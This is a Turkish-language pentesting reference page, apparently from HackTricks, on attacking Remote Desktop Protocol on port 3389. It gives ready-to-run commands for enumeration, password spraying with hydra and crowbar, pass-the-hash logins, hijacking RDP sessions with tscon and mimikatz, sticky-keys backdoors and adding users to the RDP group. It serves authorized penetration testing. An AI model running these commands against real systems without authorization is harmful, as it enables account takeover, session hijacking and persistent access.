# 3389 - RDP Pentesting

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'u **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Vulnerability assessment & penetration testing için anında kullanılabilir kurulum**. 20'den fazla araç ve özellikle tam bir pentest çalıştırın, keşiften raporlamaya kadar uzanan. Pentester'ları değiştirmiyoruz - özel araçlar, tespit ve istismar modülleri geliştiriyoruz, böylece daha derine inmek, shell'ler açmak ve eğlenmek için zaman kazanmalarını sağlıyoruz.

{% embed url="https://pentest-tools.com/" %}

## Temel Bilgiler

Microsoft tarafından geliştirilen **Remote Desktop Protocol** (**RDP**), ağ üzerinden bilgisayarlar arasında grafik arayüz bağlantısını sağlamak amacıyla tasarlanmıştır. Bu tür bir bağlantı kurmak için kullanıcı tarafından **RDP** istemci yazılımı kullanılır ve aynı anda uzak bilgisayarın **RDP** sunucu yazılımını çalıştırması gerekir. Bu kurulum, uzak bir bilgisayarın masaüstü ortamının sorunsuz kontrol ve erişimine izin verir, esasen kullanıcının yerel cihazına arayüzünü getirir.

**Varsayılan port:** 3389
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
## Sıralama

### Otomatik

{% code overflow="wrap" %}
```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
{% endcode %}

Bu, mevcut şifreleme ve DoS zafiyetini kontrol eder (hizmete DoS saldırısı yapmadan) ve NTLM Windows bilgilerini (sürümleri) elde eder.

### [Kaba kuvvet](../generic-methodologies-and-resources/brute-force.md#rdp)

**Dikkatli olun, hesapları kilitleyebilirsiniz**

### **Şifre Spreyi**

**Dikkatli olun, hesapları kilitleyebilirsiniz**
```bash
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### Bilinen kimlik bilgileri/hash ile bağlanın
```bash
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
```
### Bilinen kimlik bilgilerini RDP hizmetlerine karşı kontrol edin

rdp_check.py, impacket'ten bir betiği kullanarak belirli kimlik bilgilerinin bir RDP hizmeti için geçerli olup olmadığını kontrol etmenizi sağlar:
```bash
rdp_check <domain>/<name>:<password>@<IP>
```
<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Zafiyet değerlendirmesi ve penetrasyon testi için anında kullanılabilir kurulum**. Keşiften raporlamaya kadar olan 20'den fazla araç ve özellikle herhangi bir yerden tam bir pentest çalıştırın. Pentester'ları değiştirmiyoruz - özel araçlar, tespit ve istismar modülleri geliştiriyoruz ki onlar daha derine inebilsin, kabuklar açabilsin ve eğlenebilsin.

{% embed url="https://pentest-tools.com/" %}

## **Saldırılar**

### Oturum çalma

**SİSTEM izinleriyle** herhangi bir **kullanıcının açık RDP oturumuna** sahip olabilir ve sahibinin şifresini bilmeye gerek duymazsınız.

**Açık oturumları alın:**
```
query user
```
**Seçilen oturuma erişim**
```bash
tscon <ID> /dest:<SESSIONNAME>
```
Şimdi seçilen RDP oturumunun içinde olacaksınız ve yalnızca Windows araçları ve özelliklerini kullanarak bir kullanıcıyı taklit etmeniz gerekecek.

**Önemli**: Etkin bir RDP oturumuna eriştiğinizde, o oturumu kullanan kullanıcıyı atacaksınız.

Şifreleri işlemi dökerek alabilirsiniz, ancak bu yöntem çok daha hızlıdır ve kullanıcının sanal masaüstleriyle etkileşime girmenizi sağlar (şifrelerin diske kaydedilmeden not defterinde, diğer makinelerde açılan diğer RDP oturumları...)

#### **Mimikatz**

Bunu yapmak için mimikatz'ı da kullanabilirsiniz:
```bash
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
```
### Sticky-keys & Utilman

Bu teknikleri **stickykeys** veya **utilman ile birleştirerek her zaman yönetici CMD'sine ve herhangi bir RDP oturumuna erişebileceksiniz**

Zaten bu tekniklerden biriyle backdoor eklenmiş RDP'leri arayabilirsiniz: [https://github.com/linuz/Sticky-Keys-Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

### RDP Process Injection

Farklı bir etki alanından veya **daha iyi ayrıcalıklara sahip biri RDP** üzerinden **siz Admin olduğunuz PC'ye giriş yaptığında**, onun **RDP oturum sürecine beacon'ınızı enjekte edebilir** ve onun gibi davranabilirsiniz:

{% content-ref url="../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md)
{% endcontent-ref %}

### Adding User to RDP group
```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```
## Otomatik Araçlar

* [**AutoRDPwn**](https://github.com/JoelGMSec/AutoRDPwn)

**AutoRDPwn**, öncelikle Microsoft Windows bilgisayarlarında **Shadow** saldırısını otomatikleştirmek için tasarlanmış Powershell'de oluşturulmuş bir son aşama saldırı çerçevesidir. Bu zafiyet (Microsoft tarafından bir özellik olarak listelenmiştir), uzaktan bir saldırganın, işletim sistemi içinde bulunan araçları kullanarak **kurbanının masaüstünü izlemesine** ve isteğe bağlı olarak kontrol etmesine olanak tanır.

* [**EvilRDP**](https://github.com/skelsec/evilrdp)
* Fare ve klavyeyi komut satırından otomatik olarak kontrol etme
* Pano üzerinden komut satırından otomatik olarak kontrol etme
* İstemciden bir SOCKS proxy oluşturarak ağ iletişimini hedefe RDP aracılığıyla yönlendirme
* Hedef üzerinde dosya yükleme ve indirme, hedefte dosya transferleri devre dışı bırakıldığında bile
* Dosya yükleme ve indirme, hedefte dosya transferleri devre dışı bırakıldığında bile
```
Protocol_Name: RDP    #Protocol Abbreviation if there is one.
Port_Number:  3389     #Comma separated if there is more than one.
Protocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for RDP
Note: |
Developed by Microsoft, the Remote Desktop Protocol (RDP) is designed to enable a graphical interface connection between computers over a network. To establish such a connection, RDP client software is utilized by the user, and concurrently, the remote computer is required to operate RDP server software. This setup allows for the seamless control and access of a distant computer's desktop environment, essentially bringing its interface to the user's local device.

https://book.hacktricks.xyz/pentesting/pentesting-rdp

Entry_2:
Name: Nmap
Description: Nmap with RDP Scripts
Command: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {IP}
```
<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Vulnerability assessment ve penetrasyon testi için anında kullanılabilir kurulum**. Keşiften raporlamaya kadar olan 20'den fazla araç ve özellikle herhangi bir yerden tam bir pentest çalıştırın. Biz pentesterları değiştirmiyoruz - özel araçlar, tespit ve istismar modülleri geliştiriyoruz, böylece daha derine inmek, shell'ler açmak ve eğlenmek için zaman kazanıyorlar.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking hilelerinizi paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
